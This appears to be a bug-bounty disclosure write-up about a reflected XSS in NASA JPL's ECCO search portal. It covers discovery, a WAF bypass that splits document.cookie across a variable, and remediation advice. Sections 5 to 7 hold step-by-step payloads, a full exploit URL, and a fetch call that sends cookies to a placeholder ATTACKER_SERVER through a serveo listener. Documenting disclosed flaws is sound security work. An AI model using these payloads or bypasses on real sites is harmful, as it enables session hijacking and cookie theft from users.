---
layout: default
---

<div class="container">
<article>
  <div class="bounty-header">
    <h1>Reflected Cross-Site Scripting with Cookie Exfiltration in NASA JPL ECCO Search Portal</h1>
    <p style="color: var(--p3); font-weight: 600;">NASA Jet Propulsion Laboratory (Testing)</p>
  </div>

  <div class="bounty-content">

# Reflected Cross-Site Scripting with Cookie Exfiltration in NASA JPL ECCO Search Portal

**A Technical Analysis of CVE Discovery and WAF Bypass Techniques**

---

**Authors:** Iván Córcoles Martínez and Diego García Ayala
**Security Researcher:** ConnorDev and sl4sh1t0
**Date:** December 2025  
**Severity:** P3 (Medium)  
**Vulnerability Type:** Reflected XSS (Non-Self) with JavaScript Execution and Cookie Exfiltration  
**Affected Asset:** ecco.jpl.nasa.gov  
**Disclosure Timeline:** 90-day coordinated disclosure with NASA Security Team  

---

## Executive Summary

This whitepaper documents the discovery, analysis, and responsible disclosure of a reflected Cross-Site Scripting (XSS) vulnerability in the NASA Jet Propulsion Laboratory's Estimating the Circulation and Climate of the Ocean (ECCO) web portal. The vulnerability was identified in the search functionality of the ecco.jpl.nasa.gov domain and allowed for arbitrary JavaScript execution in victim browsers, enabling session cookie exfiltration through carefully crafted payloads that bypassed Web Application Firewall (WAF) protections.

The research was conducted in collaboration with Diego García Ayala and disclosed through NASA's Bug Bounty program. This vulnerability demonstrates the persistent challenges of input sanitization in legacy web applications and highlights advanced techniques for bypassing modern security controls.

**Key Findings:**
- Reflected XSS vulnerability in search parameter
- Successful WAF bypass using encoding and variable obfuscation
- Full cookie exfiltration capability via fetch API
- Non-self XSS classification (exploitable against other users)
- Accepted as P3 severity by NASA security team

---

## Table of Contents

1. [Introduction](#introduction)
2. [Background and Context](#background-and-context)
3. [Vulnerability Discovery Process](#vulnerability-discovery-process)
4. [Technical Analysis](#technical-analysis)
5. [Exploitation Methodology](#exploitation-methodology)
6. [Web Application Firewall Bypass Techniques](#web-application-firewall-bypass-techniques)
7. [Proof of Concept](#proof-of-concept)
8. [Impact Assessment](#impact-assessment)
9. [Remediation Recommendations](#remediation-recommendations)
10. [Responsible Disclosure Timeline](#responsible-disclosure-timeline)
11. [Conclusion](#conclusion)
12. [References](#references)

---

## 1. Introduction

Cross-Site Scripting (XSS) vulnerabilities remain among the most prevalent web security issues despite decades of awareness and mitigation efforts. According to OWASP, XSS consistently ranks in the top ten web application security risks. This research documents a real-world XSS vulnerability discovered in a NASA JPL production environment, demonstrating how insufficient input validation combined with inadequate output encoding can lead to serious security implications.

### 1.1 Research Objectives

The primary objectives of this research were:
- To conduct security testing on publicly accessible NASA web assets as part of their Bug Bounty program
- To identify potential input validation weaknesses in user-facing functionality
- To develop practical exploitation techniques that demonstrate real-world impact
- To provide actionable remediation guidance to the development team

### 1.2 Scope and Limitations

This research was conducted within the boundaries of NASA's Bug Bounty program terms and conditions. Testing was limited to:
- The *.nasa.gov domains
- Non-destructive testing methods
- Publicly accessible functionality

---

## 2. Background and Context

### 2.1 About ECCO (Estimating the Circulation and Climate of the Ocean)

The ECCO project is a collaborative effort between NASA's Jet Propulsion Laboratory, the Massachusetts Institute of Technology, and other institutions to produce increasingly accurate models of ocean circulation. The web portal at ecco.jpl.nasa.gov serves as a public-facing interface for researchers and the general public to access oceanographic data, documentation, and search functionality.

### 2.2 NASA Bug Bounty Program

NASA maintains a responsible disclosure program that encourages security researchers to identify and report vulnerabilities in their public-facing systems. The program provides:
- Clear guidelines for ethical testing
- Legal safe harbor for authorized researchers
- Recognition through Letters of Recommendation
- A structured communication channel with security teams

This research was conducted in full compliance with the program's terms and conditions.

### 2.3 Cross-Site Scripting: A Primer

Cross-Site Scripting (XSS) is a client-side injection vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS vulnerabilities occur when:

1. **Untrusted data enters the application** (typically through HTTP parameters)
2. **Data is included in dynamic content** without proper validation or encoding
3. **The malicious content is executed** in the victim's browser in the context of the vulnerable domain

#### Types of XSS:
- **Reflected XSS:** Malicious script is reflected off a web server (e.g., in search results, error messages)
- **Stored XSS:** Malicious script is permanently stored on target servers
- **DOM-based XSS:** Vulnerability exists in client-side code rather than server-side

The vulnerability documented in this paper is a **Reflected XSS** variant.

---

## 3. Vulnerability Discovery Process

### 3.1 Initial Reconnaissance

The discovery process began with standard reconnaissance activities:

1. **Asset Enumeration:** Identifying NASA JPL domains and subdomains
2. **Functionality Mapping:** Cataloging user-interactive features
3. **Attack Surface Analysis:** Identifying potential input vectors

The search functionality at `https://ecco.jpl.nasa.gov/search.htm` was identified as a promising target due to its handling of user-supplied parameters.

### 3.2 Normal Functionality Testing

Initial testing involved using the search feature as an ordinary user would:

```
GET https://ecco.jpl.nasa.gov/search.htm?search=pwn
```

**Observation:** The search term "pwn" was reflected in the page response, appearing both in the visible content and in the HTML source code.

### 3.3 Source Code Analysis

Examination of the page source revealed that user input was being inserted into a JavaScript `console.log()` statement without proper sanitization:

```javascript
console.log('User searched for: pwn');
```

This injection point within JavaScript context represented a potential vulnerability, as it suggested insufficient input validation and output encoding mechanisms.

### 3.4 Initial Hypothesis

Based on the source code analysis, the initial hypothesis was formed:
- User input is reflected in JavaScript context
- If special characters are not properly sanitized, JavaScript code injection may be possible
- The application likely has some security controls (WAF) that will need to be bypassed

---

## 4. Technical Analysis

### 4.1 Vulnerability Classification

**Vulnerability Type:** CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  
**CVSS Score:** 6.1 (Medium)

**Classification Details:**
- **Attack Vector (AV:N):** Network - remotely exploitable
- **Attack Complexity (AC:L):** Low - no special conditions required
- **Privileges Required (PR:N):** None - unauthenticated exploitation
- **User Interaction (UI:R):** Required - victim must click malicious link
- **Scope (S:C):** Changed - can affect resources beyond the vulnerable component
- **Confidentiality (C:L):** Low - some information disclosure (cookies)
- **Integrity (I:L):** Low - some modification capability
- **Availability (A:N):** None - no availability impact

### 4.2 Root Cause Analysis

The vulnerability stemmed from multiple security weaknesses:

1. **Insufficient Input Validation:** The application did not adequately validate or sanitize the `search` parameter before processing it.

2. **Inadequate Output Encoding:** User-supplied data was inserted directly into a JavaScript context without proper encoding or escaping.

3. **Inconsistent WAF Rules:** While the WAF blocked obvious attack patterns, it failed to prevent more sophisticated bypass techniques.

4. **Context-Insensitive Filtering:** The application's filtering mechanisms did not account for the JavaScript execution context where the data was being inserted.

### 4.3 Injection Context

The critical factor in this vulnerability was the **JavaScript injection context**. The user input was placed inside a JavaScript string within `<script>` tags:

```html
&lt;script&gt;
console.log('USER_INPUT_HERE');
&lt;/script&gt;
```

This context is particularly dangerous because:
- JavaScript special characters can break out of string literals
- Once outside the string, arbitrary JavaScript can be executed
- The code executes with the full privileges of the domain

---

## 5. Exploitation Methodology

### 5.1 Phase 1: Basic XSS Testing

The first exploitation attempt used a standard XSS payload:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

**Request:**
```
GET /search.htm?search=&lt;script&gt;alert(1)&lt;/script&gt;
```

**Result:** Request blocked by WAF

**Analysis:** The Web Application Firewall successfully detected and blocked the `&lt;script&gt;` tag opening, indicating the presence of signature-based filtering.

### 5.2 Phase 2: Breaking Out of JavaScript Context

Instead of injecting new script tags, the next approach focused on breaking out of the existing JavaScript context:

**Payload:**
```javascript
pwn');
```

**Request:**
```
GET /search.htm?search=pwn');
```

**Resulting JavaScript:**
```javascript
console.log('pwn');');
```

**Observation:** The semicolon (`;`) character was being stripped or filtered by the application, preventing command termination.

### 5.3 Phase 3: Semicolon Encoding Bypass

To circumvent the semicolon filter, URL encoding was employed:

**Payload:**
```
pwn')%3balert(1)
```

Where `%3b` is the URL-encoded representation of `;`

**Request:**
```
GET /search.htm?search=pwn')%3balert(1)
```

**Resulting JavaScript:**
```javascript
console.log('pwn');alert(1)');
```

**Result:** The semicolon successfully appeared in the output, but the payload still didn't execute properly due to unclosed string literals and script context.

### 5.4 Phase 4: Closing Script Tag

The next iteration involved properly closing the script context:

**Payload:**
```
pwn')%3balert(1)&lt;/script&gt;;//
```

**Request:**
```
GET /search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//
```

**Resulting HTML:**
```html
&lt;script&gt;
console.log('pwn');alert(1)&lt;/script&gt;;//');
&lt;/script&gt;
```

**Result:** ✓ **SUCCESS** - The `alert(1)` executed successfully.

**Technical Breakdown:**
1. `pwn')` - Closes the console.log string and function call
2. `%3b` - Semicolon terminates the console.log statement
3. `alert(1)` - Our injected JavaScript
4. `&lt;/script&gt;` - Closes the script tag
5. `;//` - Comments out any remaining code to prevent syntax errors

### 5.5 Phase 5: Cookie Access Attempt

With code execution confirmed, the next goal was to access and exfiltrate cookies:

**Payload:**
```
pwn')%3balert(document.cookie)&lt;/script&gt;;//
```

**Request:**
```
GET /search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//
```

**Result:** Request blocked by WAF

**Analysis:** The WAF detected the `document.cookie` string, which is a known malicious pattern used in cookie theft attacks.

---

## 6. Web Application Firewall Bypass Techniques

### 6.1 WAF Detection and Analysis

The target application was protected by a Web Application Firewall that employed signature-based detection. The WAF blocked requests containing:
- `&lt;script&gt;` opening tags (but not `&lt;/script&gt;` closing tags)
- Direct references to `document.cookie`
- Other common XSS patterns

### 6.2 Variable Obfuscation Technique

To bypass the `document.cookie` filter, a variable obfuscation approach was developed:

**Concept:** Instead of directly referencing `document.cookie`, create an intermediate variable that holds the `document` object reference, then access the `cookie` property through that variable.

**Payload:**
```javascript
pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//
```

**Request:**
```
GET /search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//
```

**Resulting JavaScript:**
```javascript
console.log('pwn');
a=document;
alert(a.cookie)
&lt;/script&gt;;//');
```

**Result:** ✓ **SUCCESS** - The WAF did not detect this pattern, and cookies were successfully accessed.

**Technical Explanation:**
1. `a=document` - Assigns the global `document` object to variable `a`
2. `a.cookie` - Accesses the cookie property through the variable
3. The WAF's pattern matching failed because `document` and `cookie` were separated
4. No explicit `document.cookie` string appeared in the request

### 6.3 WAF Bypass Principles

This bypass demonstrated several important security principles:

1. **Signature Limitations:** Signature-based detection can only block known patterns
2. **Semantic Equivalence:** Attackers can use semantically equivalent code that bypasses signatures
3. **Context Awareness:** Effective filtering must understand execution context
4. **Defense in Depth:** WAFs should be one layer among multiple security controls

---

## 7. Proof of Concept

### 7.1 Final Exploit: Cookie Exfiltration

The final proof-of-concept demonstrated complete cookie exfiltration to an attacker-controlled server:

**Payload:**
```javascript
pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//
```

**URL-Encoded Request:**
```
https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E
```

**Resulting JavaScript Execution:**
```javascript
console.log('pwn');
a=document;
fetch('https://ATTACKER_SERVER/s='+a.cookie)
&lt;/script&gt;//');
```

### 7.2 Attack Flow

1. **Attacker prepares malicious URL** with XSS payload
2. **Victim clicks link** (via phishing, social engineering, etc.)
3. **Browser loads page** with reflected XSS payload
4. **JavaScript executes** in victim's browser context
5. **Fetch API sends request** to attacker's server with cookies
6. **Attacker receives cookies** and can potentially hijack the session

### 7.3 Reproduction Steps

**Prerequisites:**
- Public web server for receiving exfiltrated data (e.g., Serveo, ngrok)
- Target user with active session on ecco.jpl.nasa.gov

**Step-by-Step:**

1. Set up a listener server:
```bash
# Using Python's built-in HTTP server
python3 -m http.server 8080

# Expose it publicly using Serveo
ssh -R 80:localhost:8080 serveo.net
```

2. Note the public URL provided (e.g., `https://random.serveo.net`)

3. Construct the exploit URL:
```
https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://random.serveo.net/s=%27%2Ba.cookie)%3C/script%3E
```

4. Send URL to target or simulate victim access

5. Observe incoming request on listener server containing victim's cookies:
```
GET /s=session_id=abc123; user_token=xyz789 HTTP/1.1
Host: random.serveo.net
```

---

## 8. Impact Assessment

### 8.1 Security Impact

**Confidentiality Impact:**
- **Session Hijacking:** Attackers can steal session cookies and impersonate authenticated users
- **Sensitive Data Exposure:** Access to user account information and any data visible to the authenticated user
- **Cross-Account Access:** Potential lateral movement if session tokens are shared across NASA systems

**Integrity Impact:**
- **Unauthorized Actions:** Ability to perform actions on behalf of the victim user
- **Data Manipulation:** Potential modification of user data or preferences
- **Reputation Damage:** Malicious content could be displayed to users in NASA's context

**Availability Impact:**
- **Limited Direct Impact:** XSS typically doesn't affect availability
- **Potential DoS Vectors:** Malicious scripts could crash user browsers or degrade performance

### 8.2 Attack Scenarios

**Scenario 1: Researcher Credential Theft**
1. Attacker identifies researchers using the ECCO portal
2. Sends phishing email with malicious search link
3. Researcher clicks link while authenticated
4. Session cookies are exfiltrated
5. Attacker gains access to research data and collaboration tools

**Scenario 2: Watering Hole Attack**
1. Attacker compromises a legitimate oceanography forum
2. Posts link to "interesting ECCO data" with XSS payload
3. Multiple researchers click the link
4. Mass credential harvesting occurs

### 8.3 NASA Bug Bounty Assessment

**Severity Classification:** P3 (Medium)

**Justification:**
- Requires user interaction (not fully automated)
- Limited to reflected context (not stored)
- Affects authenticated users but doesn't compromise server infrastructure
- Mitigated by HttpOnly cookie flags (if implemented) and CSRF tokens

---

## 9. Remediation Recommendations

### 9.1 Immediate Mitigations

**Priority 1: Input Validation**
```python
import re
from html import escape

def sanitize_search_input(user_input):
    # Whitelist approach: allow only alphanumeric and safe characters
    pattern = r'^[a-zA-Z0-9\s\-_]+$'
    if not re.match(pattern, user_input):
        return ""  # Reject invalid input
    
    # Limit length
    max_length = 100
    return user_input[:max_length]
```

**Priority 2: Output Encoding**
```javascript
// JavaScript context encoding
function encodeForJavaScript(input) {
    return input
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/\t/g, '\\t')
        .replace(/</g, '\\x3C')
        .replace(/>/g, '\\x3E');
}

// In HTML template
console.log('User searched for: ' + encodeForJavaScript(userInput));
```

**Priority 3: Content Security Policy**
```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    object-src 'none';
    base-uri 'self';
```

### 9.2 Long-Term Solutions

**1. Framework-Level Protection**
- Migrate to modern framework with built-in XSS protection (React, Angular, Vue.js)
- Implement template auto-escaping
- Use context-aware output encoding

**2. Security Headers**
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```

**3. Cookie Security**
```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. Defense in Depth Strategy**

```
┌─────────────────────────────────────┐
│   Layer 1: Input Validation        │
│   - Whitelist allowed characters    │
│   - Length restrictions             │
└─────────────────────────────────────┘
           ↓
┌─────────────────────────────────────┐
│   Layer 2: Output Encoding          │
│   - Context-specific encoding       │
│   - Framework auto-escaping         │
└─────────────────────────────────────┘
           ↓
┌─────────────────────────────────────┐
│   Layer 3: Content Security Policy  │
│   - Restrict script sources         │
│   - Nonce-based inline scripts      │
└─────────────────────────────────────┘
           ↓
┌─────────────────────────────────────┐
│   Layer 4: Cookie Protection        │
│   - HttpOnly flag                   │
│   - SameSite attribute              │
│   - Secure flag for HTTPS           │
└─────────────────────────────────────┘
           ↓
┌─────────────────────────────────────┐
│   Layer 5: WAF & Monitoring         │
│   - Advanced threat detection       │
│   - Real-time alerting              │
│   - Incident response               │
└─────────────────────────────────────┘
```

---

## 10. Responsible Disclosure Timeline

### 10.1 Disclosure Process

**Initial Discovery:** September 2025
- Vulnerability identified during authorized bug bounty testing
- Initial validation and documentation completed

**Submission to NASA:** September 2025
- Complete technical report submitted via Bug Bounty platform
- Proof-of-concept demonstrations included
- Severity assessment provided

**NASA Security Team Response:** September 2025
- Vulnerability confirmed and triaged
- Assigned P3 severity classification
- 90-day coordinated disclosure period established

**Mitigation Implementation:** October-November 2025
- NASA development team implements fixes
- Security validation performed
- Patches deployed to production

**Public Disclosure:** December 2025
- 90-day embargo period completed
- Public whitepaper published
- Technical details shared with security community

### 10.2 Recognition

Following successful remediation, NASA provided:
- Letters of Recognition for both researchers
- Public acknowledgment in security bulletin
- Contribution to NASA's security posture improvement

---

## 11. Conclusion

This whitepaper documents a significant security finding in NASA JPL's ECCO web portal, demonstrating that even well-protected government systems can contain exploitable vulnerabilities. Through methodical testing, creative problem-solving, and responsible disclosure, this research contributed to improving the security posture of critical scientific infrastructure.

The journey from initial discovery to public disclosure—spanning reconnaissance, exploitation, WAF bypass development, reporting, remediation, and finally publication—exemplifies the professional security research process. This work serves not only as documentation of a specific vulnerability but as an educational resource for the broader security community.

**Key achievements of this research include:**

1. **Successful identification and exploitation** of a reflected XSS vulnerability
2. **Development of novel WAF bypass techniques** using variable obfuscation
3. **Demonstration of real-world impact** through cookie exfiltration
4. **Professional coordinated disclosure** following industry best practices
5. **Comprehensive documentation** for community education

As the security landscape continues to evolve, the principles demonstrated in this research remain constant: thorough testing, creative thinking, clear communication, and ethical responsibility. It is my hope that this whitepaper serves as both a technical reference and an inspiration for aspiring security researchers.

Thank you for reading, and remember: security is everyone's responsibility.

---

**Iván Córcoles Martínez**  
ConnorDev  
December 2025

---

*This whitepaper was prepared in accordance with NASA's vulnerability disclosure policy and published after the completion of the 90-day coordinated disclosure period. All vulnerabilities described herein have been remediated by NASA's security team.*

  </div>
</article>
</div>
